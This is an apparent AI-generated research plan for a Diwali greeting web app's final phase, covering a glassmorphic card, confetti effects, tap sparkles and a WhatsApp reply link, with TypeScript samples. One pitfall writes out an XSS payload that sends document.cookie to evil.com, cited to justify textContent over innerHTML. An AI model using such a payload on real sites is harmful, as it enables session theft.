# Phase 5: Festive Greeting Reveal, Typography & Celebration Polish - Research
**Researched:** 2026-11-04  
**Domain:** Glassmorphism UI, DOM Security (ASVS V5 XSS Prevention), Typography & Cultural Ornamentation, 2D Canvas Confetti Physics (canvas-confetti), Interactive Touch/Tap Particles (VFX-05), Mobile Web Deep Linking (WhatsApp Web/App)  
**Confidence:** HIGH  

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

#### 1. Opulent Glassmorphic Greeting Card Modal
- **D-01: Card Staging & Motion Transition**: Upon transitioning from `LIT_CELEBRATION` to `GREETING_REVEAL` (1.5s after flame ignition):
  - Camera tilts/pans up smoothly (`panTargetTo(new THREE.Vector3(0, 0.85, 0), 1200)`).
  - The greeting card floats in with glassmorphic backdrop (`backdrop-blur-xl bg-black/40 border border-amber-500/40 rounded-3xl p-6 sm:p-8 shadow-2xl shadow-amber-950/50`).
  - Smooth CSS entrance animation (`opacity-0 scale-95 translate-y-4` -> `opacity-100 scale-100 translate-y-0` with 800ms cubic-bezier transition).
- **D-02: Safe DOM Rendering (ASVS V5 XSS Protection)**:
  - Recipient name (`payload.recipient`), sender name (`payload.sender`), and custom wish message (`payload.message`) are injected strictly using `element.textContent = ...` (never `innerHTML`) to prevent stored XSS attacks via encrypted payload injection.
  - Fallback defaults if payload is empty: Recipient: "Dear Friend", Sender: "A Well-Wisher", Message: "Wishing you and your loved ones a joyous, prosperous, and luminous Diwali! May this festival of lights illuminate your path with happiness and success."

#### 2. Festive Typography & Cultural Ornamentation
- **D-03: Gold Shimmer Serif Typography**:
  - Festive heading: *"Shubh Deepavali"* (or *"Happy Diwali"*) in warm shimmering gold gradient (`bg-gradient-to-r from-amber-200 via-yellow-400 to-amber-500 bg-clip-text text-transparent font-serif`).
  - Traditional Indian decorative motifs: Subtle SVG lotus or diya filigree divider accentuating the card.
  - Message styling: Elegant italicized quote with warm ivory/amber text (`text-amber-100/90`).

#### 3. Celebratory Particle Explosion & Interactive Tap Sparkles
- **D-04: Celebratory Golden Confetti**:
  - Install `canvas-confetti@^1.9.4` (isolated 2D canvas overlay, ~6 KB gzipped, zero WebGL pipeline burden).
  - Fires dual-cannon golden/amber festive confetti bursts upon greeting reveal:
    - Colors: `['#ffd700', '#ffa500', '#ff8c00', '#fff8dc', '#b8860b']`
    - High-velocity spread (angle 60 and 120, spread 70, particleCount 80 per cannon).
- **D-05: Interactive Tap-to-Sparkle (`VFX-05`)**:
  - While in `GREETING_REVEAL` or `LIT_CELEBRATION`, tapping or clicking on the background screen outside the card triggers an instant celebratory sparkle burst at the touch coordinate:
    - Uses `canvas-confetti({ origin: { x: clientX/width, y: clientY/height }, particleCount: 25, spread: 45, startVelocity: 15, scalar: 0.6, colors: ['#ffd700', '#ff9900', '#fff'] })`.
    - Delights recipients by letting them celebrate actively with micro-fireworks.

#### 4. Viral WhatsApp Reciprocation Loop
- **D-06: 1-Tap WhatsApp Reply Button**:
  - Prominent gold-accented button: *"Reply Happy Diwali on WhatsApp ✨"*.
  - Encodes URI message: `https://wa.me/?text=Thank%20you%20so%20much%20for%20the%20beautiful%20Diwali%20Diya%20greeting!%20Wishing%20you%20and%20your%20family%20a%20very%20Happy%20Diwali%20too!%20%F0%9F%AA%94%E2%9C%A8`.
  - Opens WhatsApp in new tab / app directly.

#### 5. Architectural & Resource Cleanup
- **D-07: Component Encapsulation & Teardown**:
  - `GreetingModal` component manages card DOM, text injection, and WhatsApp link.
  - `CelebrationManager` manages confetti cannons and tap-to-sparkle listener.
  - Strict `dispose()` methods removing event listeners, canvas overlays, and DOM nodes.

### the agent's Discretion
- Exact SVG ornamental path geometry for the lotus/diya filigree divider.
- Specific easing curve timings for card entrance (`cubic-bezier(0.16, 1, 0.3, 1)` vs standard `ease-out`).
- Dual-cannon staging (single burst vs staggered 250ms secondary cascade).
- Interactive tap sparkle particle configuration tuning (ticks, gravity, scalar).
- Creator Instagram profile badge positioning and styling within the card footer.

### Deferred Ideas (OUT OF SCOPE)
- Custom sound selection or voice note audio attachment (deferred to v2 / post-MVP).
- Photo/portrait attachment inside the greeting reveal card (MEDIA-01, deferred to v2).
- Automated in-app payment gateway checkout (ECOMM-01, deferred to v2).
- Dynamic theme selection (brass diya, royal silver thali, background courtyards, THEME-01).
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| **VFX-05** | Recipient can tap anywhere on the lit 3D canvas to trigger celebratory interactive sparkler showers. | Leverages `canvas-confetti` with dynamic normalized touch origin `{ x: clientX / innerWidth, y: clientY / innerHeight }`, firing 25 golden micro-particles with low spread (45°) and quick dissipation (100 ticks). Encapsulated in `CelebrationManager`, with click delegation ignoring clicks on interactive UI elements. |
| **WISH-01** | Successful diya ignition transitions into an elegant glassmorphic greeting card with staggered gold shimmer typography (Recipient, Sender, Personal Message). | Implemented in `GreetingModal` mounting a glassmorphic card (`backdrop-blur-xl bg-black/40 border-amber-500/40 rounded-3xl`) with CSS entrance animation (`opacity-0 scale-95 translate-y-4` to `opacity-100 scale-100 translate-y-0`), strict `textContent` injection preventing XSS (ASVS V5), and default fallbacks. |
| **WISH-02** | Recipient can tap a WhatsApp button to send a pre-filled warm "Thank You / Happy Diwali" reaction back to the sender. | Encodes pre-filled festive reply text using RFC 3986 `encodeURIComponent()` targeting `https://wa.me/?text=...`, opening natively in WhatsApp on mobile and WhatsApp Web on desktop with `rel="noopener noreferrer"`. |
| **WISH-03** | Greeting displays a discreet festive footer badge linking to the creator's Instagram profile for recipients to order custom greetings. | Discreet festive badge in the modal footer linking to the creator's Instagram profile / `#create` generator with festive emoji and subtle amber hover styling, driving viral acquisition without intruding on the greeting's emotional intimacy. |
</phase_requirements>

## Project Constraints (from GEMINI.md)

- **Performance**: High frame rate (60fps) on mid-tier mobile smartphones without draining battery or causing lag.
- **Simplicity**: No complex onboarding, app download, or backend maintenance required for either creator or recipient.
- **Responsive Web**: Clean layout adapting seamlessly across mobile viewports, tablets, and desktop displays (`100svh`, dynamic safe area insets).
- **Audio Autoplay Policies**: Ambient music must continue smoothly during greeting reveal without interruption.
- **No Heavy Physics Engines**: No Cannon.js, Rapier3D, or Ammo.js. Use `canvas-confetti` (~6 KB gzipped) on an isolated 2D canvas overlay, leaving the WebGL pipeline completely unburdened.
- **No Full-Screen Post-Processing Bloom**: Avoid expensive multi-pass bloom passes (`UnrealBloomPass`); rely on existing additive billboard glow and CSS backdrop filters (`backdrop-blur-xl`).

## Summary

Phase 5 culminates the emotional core of the Diwali 3D Wishes experience. When the recipient drags the virtual matchstick to the cotton wick, the procedural flame ignites and sparklers burst (`LIT_CELEBRATION`). After a 1500ms celebratory pause where the flickering flame illuminates the nocturnal courtyard, the experience smoothly ascends into its grand finale:
1. **Cinematic Framing & Glassmorphic Reveal**: The camera smoothly pans upward (`panTargetTo(new THREE.Vector3(0, 0.85, 0), 1200)`), elevating the diya into the lower third of the display. An opulent glassmorphic card floats into the viewport (`opacity-0 scale-95 translate-y-4` -> `opacity-100 scale-100 translate-y-0`), framed with gold shimmer typography, an authentic SVG lotus/diya filigree motif, and the recipient's custom message safely rendered via strict `textContent` DOM nodes (ASVS V5 XSS immunity).
2. **Golden Celebration Confetti & Interactive Tap Sparkles**: Synchronized with the card unfurling, a dual-cannon golden confetti burst (`canvas-confetti@^1.9.4`) erupts from the lower screen flanks, arching inward with warm metallic amber and gold hues. Throughout the reveal state (`GREETING_REVEAL`), tapping anywhere on the surrounding background fires localized micro-sparkler bursts at the exact touch coordinates (`VFX-05`), accompanied by subtle flame crackle sound effects and haptic feedback.
3. **Viral Reciprocation & Organic Acquisition Loop**: The card anchors a prominent gold-gradient button enabling 1-tap WhatsApp reciprocation (`https://wa.me/?text=...`) so the recipient can immediately express heartfelt gratitude back to the sender (`WISH-02`), complemented by a discreet creator Instagram badge (`WISH-03`) sparking viral customer acquisition.

**Primary recommendation:** Introduce `GreetingModal` for glassmorphic DOM presentation with strict `textContent` sanitization, and `CelebrationManager` for dual-cannon confetti and tap-to-sparkle coordination via `canvas-confetti@^1.9.4`, orchestrated by a 1500ms delay in `SceneManager` bridging `LIT_CELEBRATION` to `GREETING_REVEAL`.

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| **Greeting Card Presentation** | Browser / DOM (`Tailwind CSS`) | Client FSM | Glassmorphic card overlay with `backdrop-blur-xl` and CSS transitions mounted at `z-10` above 3D canvas. |
| **XSS Prevention & Text Injection** | Client UI Controller (`GreetingModal`) | Crypto Payload Contract | User strings (`recipient`, `message`, `sender`) written strictly to `element.textContent`, immune to script injection. |
| **Celebratory Confetti Cannons** | Browser 2D Canvas (`canvas-confetti`) | Client FSM | Hardware-accelerated 2D canvas overlay (~6 KB gz) running independently of Three.js WebGL pipeline. |
| **Interactive Tap-to-Sparkle** | Browser DOM Event Loop (`PointerEvent`) | Celebration Engine | Normalized pointer coordinates mapped to confetti origin; filtered to ignore clicks on interactive card buttons. |
| **Cinematic Camera Re-framing** | Client 3D Scene (`CameraRig`) | SceneManager | `panTargetTo(Vector3(0, 0.85, 0), 1200)` elevates look-at target by +0.20 units, framing diya in lower third. |
| **WhatsApp Deep Linking** | Native Mobile OS / WhatsApp App | Browser Protocol Handler | Standard `https://wa.me/?text=` URI scheme opens WhatsApp mobile app on iOS/Android or WhatsApp Web on desktop. |
| **Creator Attribution / Viral Loop** | Browser / DOM Anchor | Instagram Web / App | External link (`target="_blank" rel="noopener noreferrer"`) driving recipient-to-buyer conversion. |
| **Lifecycle & Teardown** | Client Application Coordinator | SceneManager & UI | Strict `dispose()` cascades removing event listeners, clearing timers, resetting confetti, and unmounting DOM nodes. |

## Standard Stack

### Core
| Library / API | Version | Purpose | Why Standard |
|---------------|---------|---------|--------------|
| **canvas-confetti** | `^1.9.4` [VERIFIED: npm registry] | Dual-cannon celebration burst & tap-to-sparkle | Battle-tested, zero-dependency, ultra-lightweight (~5.8 KB gz / 15 KB raw). Creates an isolated 2D canvas overlay with `pointer-events: none`, leaving WebGL render budget untouched. |
| **@types/canvas-confetti** | `^1.9.0` [VERIFIED: npm registry] | TypeScript definitions for canvas-confetti | Comprehensive TypeScript interface contracts for `Options`, `GlobalOptions`, `create`, and `reset`. |
| **Three.js** | `^0.187.0` [VERIFIED: npm registry] | 3D Camera Rig & Scene Re-framing | Existing project 3D engine; coordinates smooth quadratic camera pan target transitions via Tween.js. |
| **@tweenjs/tween.js** | `^25.0.0` [VERIFIED: npm registry] | Camera Pan Interpolation | Existing lightweight (~3.5 KB gz) tweening engine driving `CameraRig.panTargetTo()`. |
| **Tailwind CSS** | `^4.0.0` [VERIFIED: npm registry] | Glassmorphic UI Card & Shimmer Typography | Utility-first CSS engine providing `backdrop-blur-xl`, `bg-black/40`, gradient text clipping, and responsive viewport sizing. |

### Supporting
| Library / API | Version | Purpose | When to Use |
|---------------|---------|---------|-------------|
| **Web Crypto API & GreetingCodec** | Native / In-Repo [VERIFIED: src/crypto/types.ts:1-7] | `GreetingPayload` extraction | Unlocks decrypted `recipient`, `sender`, and `message` strings on passcode success. |
| **Native Pointer Events** (`pointerdown`) | W3C Standard [VERIFIED: MDN] | Touch and click capture for `VFX-05` | Unified mobile touch and desktop click handling without 300ms tap delay or double-tap zoom. |
| **Vibration API** (`navigator.vibrate`) | W3C Standard [VERIFIED: MDN] | Tactile tap micro-burst feedback | Optional 15ms haptic pulse on supported Android devices when tapping to sparkle. |
| **AudioEngine (playFlameCrackle)** | In-Repo [VERIFIED: src/audio/audio-engine.ts] | Multisensory audio feedback on tap | Reuses procedural crackle synthesizer for instant micro-audio response on screen taps. |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| **`canvas-confetti` (2D Canvas)** | Three.js 3D Confetti Particles (`THREE.InstancedMesh`) | 3D instanced confetti requires vertex shaders, tumbling quaternions, matrix updates in RAF, and alpha blending passes that degrade mobile WebGL fill rate. `canvas-confetti` runs on an isolated 2D canvas off-thread or via efficient 2D context at zero WebGL cost. |
| **`canvas-confetti` (2D Canvas)** | CSS DOM Particle Elements | Spawning 100+ DOM `<div>` elements triggers massive layout reflows and style recalculations on mobile WebKit, causing frame drops during the greeting entrance transition. |
| **Strict `textContent` DOM Injection** | `DOMPurify` / HTML Sanitization | Adding `DOMPurify` injects ~16 KB gzipped of parsing overhead. Because the greeting card format is strictly structured text (name, quote, sender), `element.textContent` provides 100% mathematical XSS immunity at 0 KB footprint. |
| **`https://wa.me/?text=`** | Native Web Share API (`navigator.share`) | `navigator.share` opens the generic OS share sheet (AirDrop, Notes, Email, Copy Link), adding friction and losing the direct personal 1-to-1 reply context. `wa.me` deep links directly to the sender's messaging app. |

**Installation:**
```bash
npm install canvas-confetti@^1.9.4
npm install -D @types/canvas-confetti@^1.9.0
```

**Version verification:**
- `canvas-confetti@1.9.4` published 2025-10-25 [VERIFIED: npm registry]
- `@types/canvas-confetti@1.9.0` published 2024-12-17 [VERIFIED: npm registry]

## Package Legitimacy Audit

The Package Legitimacy Gate was executed for all new and supporting packages:

```bash
gsd_run query package-legitimacy check --ecosystem npm canvas-confetti @types/canvas-confetti
```

| Package | Registry | Age | Downloads | Source Repo | Verdict | Disposition |
|---------|----------|-----|-----------|-------------|---------|-------------|
| `canvas-confetti` | npm | 7 yrs | 9.6M/wk | github.com/catdad/canvas-confetti | [OK] [VERIFIED: npm registry] | Approved |
| `@types/canvas-confetti` | npm | 6 yrs | 8.0M/wk | github.com/DefinitelyTyped/DefinitelyTyped | [OK] [VERIFIED: npm registry] | Approved |
| `three` | npm | 14 yrs | 33M/wk | github.com/mrdoob/three.js | [OK] [VERIFIED: npm registry] | Approved (existing) |
| `@tweenjs/tween.js` | npm | 14 yrs | 21M/wk | github.com/tweenjs/tween.js | [OK] [VERIFIED: npm registry] | Approved (existing) |
| `tailwindcss` | npm | 7 yrs | 14M/wk | github.com/tailwindlabs/tailwindcss | [OK] [VERIFIED: npm registry] | Approved (existing) |

**Packages removed due to [SLOP] verdict:** none  
**Packages flagged as suspicious [SUS]:** none  
**Postinstall script check:** `canvas-confetti` contains no `postinstall` script (`scripts.postinstall: null`) [VERIFIED: npm view].

## In-Repo Discrete Value Citations

Per the in-repo value provenance rule, the following discrete values were opened and verified directly from the source-of-truth files during this session:

1. **State Machine States and Events** [VERIFIED: src/app/state-machine.ts:3-19]
   Verbatim quote:
```typescript
export type AppState =
  | 'BOOT'
  | 'LOCKED'
  | 'UNLOCKED_INTRO'
  | 'INTERACTIVE_UNLIT'
  | 'IGNITING'
  | 'LIT_CELEBRATION'
  | 'GREETING_REVEAL';

export type AppEvent =
  | { type: 'BOOT_COMPLETE'; hasCiphertext: boolean }
  | { type: 'UNLOCK_SUCCESS'; payload: GreetingPayload }
  | { type: 'INTRO_COMPLETE' }
  | { type: 'WICK_TOUCHED' }
  | { type: 'IGNITION_COMPLETE' }
  | { type: 'CELEBRATION_COMPLETE' }
  | { type: 'REPLAY' };
```

2. **GreetingPayload Interface** [VERIFIED: src/crypto/types.ts:1-7]
   Verbatim quote:
```typescript
export interface GreetingPayload {
  recipient: string;
  sender: string;
  message: string;
  templateId?: string;
  createdAt?: number;
}
```

3. **Camera Pan Target Tween** [VERIFIED: src/graphics/camera-rig.ts:96-105]
   Verbatim quote:
```typescript
  public panTargetTo(targetLook: THREE.Vector3, durationMs: number = 1000): Promise<void> {
    return new Promise((resolve) => {
      const tween = new TWEEN.Tween(this.currentTarget, true)
        .to({ x: targetLook.x, y: targetLook.y, z: targetLook.z }, durationMs)
        .easing(TWEEN.Easing.Quadratic.Out)
        .onComplete(() => resolve())
        .start();
      TWEEN.add(tween);
    });
  }
```

4. **Touch Controller Pointer Down & Ignited Lock** [VERIFIED: src/interaction/touch-controller.ts:71-79]
   Verbatim quote:
```typescript
  private onPointerDown(e: PointerEvent): void {
    if (this.isIgnited) return;

    this.isDragging = true;
    this.onTouchStart?.();
    this.matchFollower.visible = true;
    this.updatePosition(e.clientX, e.clientY);
  }
```

## Architecture Patterns

### System Architecture Diagram

```
[ User Lights Diya ]
         │
         ▼
[ FSM: IGNITING ] ─── Flame Mesh Scales Up (TWEEN 1200ms)
         │
         ▼ (IGNITION_COMPLETE)
[ FSM: LIT_CELEBRATION ] ─── 3D Flame Flutters & Sparklers Burst
         │
         │ (1500ms Celebratory Delay)
         ▼ (CELEBRATION_COMPLETE)
[ FSM: GREETING_REVEAL ]
         │
         ├──► CameraRig.panTargetTo(Vector3(0, 0.85, 0), 1200ms)
         │
         ├──► CelebrationManager.fireCelebrationBurst()
         │        ├─ Left Cannon: Angle 60°, 80 gold particles
         │        └─ Right Cannon: Angle 120°, 80 gold particles
         │
         ├──► GreetingModal.show(GreetingPayload)
         │        ├─ Injects payload.recipient via textContent
         │        ├─ Injects payload.message via textContent
         │        ├─ Injects payload.sender via textContent
         │        ├─ Generates https://wa.me/?text=... reply link
         │        └─ Animates card: opacity-0 scale-95 -> opacity-100 scale-100
         │
         └──► CelebrationManager.setActive(true)
                  │
                  ▼ (User taps anywhere outside card)
              [ Interactive Tap Sparkle (VFX-05) ]
                  ├─ Normalized origin: { x: clientX/width, y: clientY/height }
                  ├─ canvas-confetti({ particleCount: 25, spread: 45 })
                  ├─ AudioEngine.playFlameCrackle()
                  └─ navigator.vibrate(15ms)
```

### Recommended Project Structure

```
src/
├── app/
│   └── state-machine.ts          # Existing FSM coordinating states and transitions
├── crypto/
│   └── types.ts                  # GreetingPayload interface (recipient, sender, message)
├── fx/                           # NEW FX module directory
│   └── celebration-manager.ts    # Dual-cannon confetti burst & tap-to-sparkle controller
├── graphics/
│   ├── camera-rig.ts             # CameraRig with panTargetTo(Vector3, ms)
│   └── scene-manager.ts          # Coordinates 1500ms celebration delay & FSM transitions
├── ui/
│   ├── greeting-modal.ts         # NEW Glassmorphic card, textContent injection, entrance CSS
│   ├── whatsapp-link.ts          # NEW WhatsApp URI generator & encoder
│   ├── audio-toggle.ts           # Floating audio mute/unmute button
│   └── passcode-gate.ts          # Passcode unlock controller
└── main.ts                       # Application bootstrap wiring GreetingModal & CelebrationManager
```

### Pattern 1: Safe DOM Text Injection & Glassmorphic Entrance

**What:** Creating an opulent glassmorphic card modal whose text nodes are strictly populated via `textContent` rather than `innerHTML`, ensuring complete immunity to stored Cross-Site Scripting (XSS) via encrypted payloads.  
**When to use:** Whenever rendering user-controlled content from URL fragments, database records, or decrypted payloads.  
**Example:**
```typescript
// Source: OWASP ASVS v4.0.3 Chapter 5 (Input Validation & Output Encoding)
export class GreetingModal {
  private cardEl: HTMLElement | null = null;
  private recipientEl: HTMLElement | null = null;
  private messageEl: HTMLElement | null = null;
  private senderEl: HTMLElement | null = null;
  private whatsappLinkEl: HTMLAnchorElement | null = null;

  public show(payload: GreetingPayload | null): void {
    const recipient = payload?.recipient?.trim() || 'Dear Friend';
    const message = payload?.message?.trim() ||
      'Wishing you and your loved ones a joyous, prosperous, and luminous Diwali! May this festival of lights illuminate your path with happiness and success.';
    const sender = payload?.sender?.trim() || 'A Well-Wisher';

    // Strict textContent injection — zero risk of script or tag execution
    if (this.recipientEl) this.recipientEl.textContent = recipient;
    if (this.messageEl) this.messageEl.textContent = `“${message}”`;
    if (this.senderEl) this.senderEl.textContent = `— ${sender}`;

    // Update WhatsApp reciprocation deep link
    if (this.whatsappLinkEl) {
      this.whatsappLinkEl.href = createWhatsAppReplyUrl(sender);
    }

    // Trigger smooth CSS entrance animation
    if (this.cardEl) {
      this.cardEl.classList.remove('opacity-0', 'scale-95', 'translate-y-4', 'pointer-events-none');
      this.cardEl.classList.add('opacity-100', 'scale-100', 'translate-y-0', 'pointer-events-auto');
    }
  }
}
```

### Pattern 2: Dual-Cannon Confetti Burst & Tap-to-Sparkle Screen Mapping

**What:** Utilizing `canvas-confetti` to fire celebratory dual-cannon golden fountains upon greeting entrance, and mapping screen tap coordinates `(clientX, clientY)` to normalized canvas origin `(x, y)` in `[0, 1]` for responsive micro-bursts without interfering with card buttons.  
**When to use:** In `GREETING_REVEAL` state for celebratory explosions and interactive particle delight.  
**Example:**
```typescript
import confetti from 'canvas-confetti';
import { AudioEngine } from '../audio/audio-engine';

export class CelebrationManager {
  private isActive = false;
  private onPointerDownBound: (e: PointerEvent) => void;

  constructor() {
    this.onPointerDownBound = this.handlePointerDown.bind(this);
  }

  public fireCelebrationBurst(): void {
    const festiveColors = ['#ffd700', '#ffa500', '#ff8c00', '#fff8dc', '#b8860b'];

    // Left flank cannon (firing up and right)
    confetti({
      particleCount: 80,
      angle: 60,
      spread: 70,
      origin: { x: 0.05, y: 0.85 },
      colors: festiveColors,
      startVelocity: 55,
      gravity: 0.9,
      ticks: 250,
      disableForReducedMotion: true,
    });

    // Right flank cannon (firing up and left)
    confetti({
      particleCount: 80,
      angle: 120,
      spread: 70,
      origin: { x: 0.95, y: 0.85 },
      colors: festiveColors,
      startVelocity: 55,
      gravity: 0.9,
      ticks: 250,
      disableForReducedMotion: true,
    });
  }

  private handlePointerDown(e: PointerEvent): void {
    if (!this.isActive) return;

    // Ignore clicks on card buttons or links
    const target = e.target as HTMLElement | null;
    if (target?.closest('#greeting-card, button, a, input, textarea')) {
      return;
    }

    const width = window.innerWidth || 1;
    const height = window.innerHeight || 1;
    const originX = Math.max(0, Math.min(1, e.clientX / width));
    const originY = Math.max(0, Math.min(1, e.clientY / height));

    confetti({
      origin: { x: originX, y: originY },
      particleCount: 25,
      spread: 45,
      startVelocity: 18,
      scalar: 0.65,
      ticks: 100,
      colors: ['#ffd700', '#ff9900', '#ffffff', '#ffcc00', '#ffa500'],
      disableForReducedMotion: true,
    });

    // Multisensory tactile feedback
    try {
      AudioEngine.getInstance().playFlameCrackle();
    } catch {
      // Graceful no-op in test/unsupported environments
    }

    if (typeof navigator !== 'undefined' && 'vibrate' in navigator) {
      try {
        navigator.vibrate(15);
      } catch {
        // Graceful no-op
      }
    }
  }

  public dispose(): void {
    this.isActive = false;
    window.removeEventListener('pointerdown', this.onPointerDownBound);
    try {
      confetti.reset();
    } catch {
      // Ignored if canvas not mounted
    }
  }
}
```

### Anti-Patterns to Avoid
- **Using `innerHTML` to set user greetings:** Injecting `element.innerHTML = payload.message` allows any attacker crafting an encrypted token to execute malicious arbitrary JavaScript in the recipient's browser session. Always use `element.textContent`.
- **Spawning WebGL particles for full-screen confetti:** Running 200+ individual Three.js mesh instances with complex tumbling physics stalls the mobile GPU vertex pipeline and conflicts with depth testing. Use an isolated 2D canvas overlay via `canvas-confetti`.
- **Catching touch events on full-viewport overlay without `pointer-events-none`:** If the backdrop container has `pointer-events: auto`, it swallows all screen clicks, preventing the user from interacting with the 3D scene or triggering tap-to-sparkle. Set `pointer-events: none` on the overlay wrapper and `pointer-events: auto` exclusively on the card element (`#greeting-card`).
- **Unthrottled tap-to-sparkle on dragging:** Listening to `pointermove` for sparklers creates hundreds of confetti particles per second, overwhelming the 2D canvas. Restrict tap sparkles strictly to discrete `pointerdown` events.
- **Hardcoding fixed pixel heights on mobile:** Setting `height: 600px` causes cards to clip or hide the WhatsApp button on small mobile phones (e.g. iPhone SE). Use dynamic safe area insets, `max-h-[85svh]`, and `overflow-y-auto` on the message container.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| **Confetti Animation & 2D Physics** | Custom 2D canvas RAF particle integration loop | `canvas-confetti@^1.9.4` | Hand-rolled canvas loops struggle with DPR scaling, device rotation, physics drag coefficient decay, memory leaks, worker thread offloading, and prefers-reduced-motion accessibility. `canvas-confetti` solves all of these in 5.8 KB. |
| **HTML Sanitizer for Message Text** | Regex-based `<script>` stripper | Native `element.textContent` | Regex HTML sanitizers have notorious parsing bypasses (e.g., nested tags, malformed attributes, Unicode mutations). Native `textContent` sets text nodes directly, guaranteeing 100% mathematical XSS immunity without a parser. |
| **WhatsApp Deep Link Protocols** | Custom URL scheme routing hacks (`whatsapp://send`) | Standard `https://wa.me/?text=...` | Older `whatsapp://` URI schemes fail in desktop browsers and Instagram in-app webviews. `https://wa.me/` is WhatsApp's universal link protocol, smoothly opening the app on mobile and WhatsApp Web on desktop. |
| **Property Tweening & Easing** | Manual `dt` lerp math in RAF for camera pan | `@tweenjs/tween.js` (existing) | Quadratic / Cubic easing curves are already verified and battle-tested in the project's CameraRig. |

**Key insight:** In festive web experiences, user delight depends on smooth performance and visual elegance. Using `canvas-confetti` offloads the particle physics to an isolated 2D layer, leaving 100% of the WebGL GPU budget dedicated to rendering the glowing 3D diya, terracotta rim reflections, and golden flame flutter.

## Runtime State Inventory

> Greenfield feature phase (no rename/refactor migration required).

| Category | Items Found | Action Required |
|----------|-------------|------------------|
| Stored data | None | None — no server database or persistent client storage. |
| Live service config | None | None — static hosting architecture. |
| OS-registered state | None | None. |
| Secrets/env vars | None | None — zero backend secrets. |
| Build artifacts | None | None — standard Vite TypeScript compilation. |

## Common Pitfalls

### Pitfall 1: XSS Injection via Encrypted Greeting Payloads
**What goes wrong:** A malicious sender crafts an encrypted wish containing `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`. If the frontend renders the message via `innerHTML`, the script executes.  
**Why it happens:** Developers assume that because data was encrypted with AES-GCM and required a passcode, it is "trusted". In reality, the sender is untrusted.  
**How to avoid:** Enforce ASVS V5 Output Encoding by injecting all payload attributes strictly using `element.textContent = value`.  
**Warning signs:** Any usage of `innerHTML` with `payload.recipient`, `payload.sender`, or `payload.message`.

### Pitfall 2: Confetti Canvas Blocking 3D Scene Interactions
**What goes wrong:** Calling `canvas-confetti` creates a full-screen canvas element that intercepts all touch events, breaking tap-to-sparkle or preventing users from touching the screen.  
**Why it happens:** Custom canvas initializations that forget to set `pointer-events: none` on the canvas element.  
**How to avoid:** Rely on `canvas-confetti`'s default global canvas, which automatically sets `style="position: fixed; top: 0px; left: 0px; pointer-events: none; z-index: 100;"`. Never remove `pointer-events: none`.

### Pitfall 3: Card Button Clicks Triggering Background Confetti
**What goes wrong:** When the recipient taps the "Reply Happy Diwali on WhatsApp" button, a tap-to-sparkle confetti burst fires under their thumb, cluttering the button interaction or causing event bubbling glitches.  
**Why it happens:** The tap-to-sparkle event listener captures all `pointerdown` events on `window` without inspecting the event target.  
**How to avoid:** In the `handlePointerDown` callback, check `if (e.target?.closest('#greeting-card, button, a')) return;`.

### Pitfall 4: WhatsApp URL Malformation with Special Characters & Emojis
**What goes wrong:** Emojis like 🪔 and ✨ in the pre-filled reply text get corrupted into question marks or break the URL link when clicked inside Instagram's in-app browser.  
**Why it happens:** Using naive string interpolation without `encodeURIComponent()`. Emojis are 4-byte UTF-8 sequences (🪔 = `%F0%9F%AA%94`, ✨ = `%E2%9C%A8`).  
**How to avoid:** Build the reply text and pass it through RFC 3986 compliant `encodeURIComponent()` before appending to `https://wa.me/?text=`.

### Pitfall 5: Memory Leaks on Component Teardown or Replay
**What goes wrong:** If the user replays the experience or navigates away, multiple `pointerdown` listeners remain attached, timers continue firing, or confetti particles continue calculating in the background.  
**Why it happens:** Missing cleanup methods on UI and FX components.  
**How to avoid:** Implement strict `dispose()` methods on both `GreetingModal` and `CelebrationManager` that call `confetti.reset()`, remove event listeners with exact function references, clear scheduled `setTimeout` handles, and remove DOM nodes.

## Code Examples

### 1. WhatsApp Reply URL Generator (`src/ui/whatsapp-link.ts`)
```typescript
/**
 * Generates an RFC 3986 compliant universal WhatsApp deep link URL.
 * Target: https://wa.me/?text=...
 *
 * Encodes festive reply with emojis (🪔, ✨) to ensure safe routing across
 * iOS Safari, Android Chrome, and Instagram in-app WebViews.
 */
export function createWhatsAppReplyUrl(senderName?: string): string {
  const cleanSender = senderName?.trim();
  const baseMessage = cleanSender && cleanSender !== 'A Well-Wisher'
    ? `Thank you ${cleanSender} so much for the beautiful Diwali Diya greeting! Wishing you and your family a very Happy Diwali too! 🪔✨`
    : `Thank you so much for the beautiful Diwali Diya greeting! Wishing you and your family a very Happy Diwali too! 🪔✨`;

  return `https://wa.me/?text=${encodeURIComponent(baseMessage)}`;
}
```

### 2. Glassmorphic Greeting Modal (`src/ui/greeting-modal.ts`)
```typescript
import type { GreetingPayload } from '../crypto/types';
import { createWhatsAppReplyUrl } from './whatsapp-link';

/**
 * Glassmorphic greeting card modal controller per D-01, D-02, WISH-01, WISH-02, WISH-03.
 */
export class GreetingModal {
  private overlayEl: HTMLElement | null = null;
  private cardEl: HTMLElement | null = null;
  private recipientEl: HTMLElement | null = null;
  private messageEl: HTMLElement | null = null;
  private senderEl: HTMLElement | null = null;
  private whatsappBtnEl: HTMLAnchorElement | null = null;
  private creatorBadgeEl: HTMLAnchorElement | null = null;

  public mount(container: HTMLElement): void {
    if (this.overlayEl) return;

    this.overlayEl = document.createElement('div');
    this.overlayEl.id = 'greeting-modal-overlay';
    this.overlayEl.className =
      'fixed inset-0 z-10 flex items-center justify-center p-4 pointer-events-none select-none';

    this.overlayEl.innerHTML = `
      <div
        id="greeting-card"
        class="w-full max-w-sm sm:max-w-md rounded-3xl p-6 sm:p-8 bg-black/40 backdrop-blur-xl border border-amber-500/40 shadow-2xl shadow-amber-950/50 text-center transition-all duration-700 ease-out opacity-0 scale-95 translate-y-4 pointer-events-none"
      >
        <div class="text-3xl sm:text-4xl mb-1 select-none">🪔</div>
        <p class="text-xs font-semibold tracking-widest uppercase text-amber-400/80 mb-1">
          ✨ Shubh Deepavali ✨
        </p>
        <h2 class="text-2xl sm:text-3xl font-serif font-bold bg-gradient-to-r from-amber-200 via-yellow-400 to-amber-500 bg-clip-text text-transparent mb-2">
          Happy Diwali
        </h2>

        <!-- Traditional Ornamental Lotus/Diya Filigree Divider -->
        <div class="flex items-center justify-center my-3 text-amber-400/50">
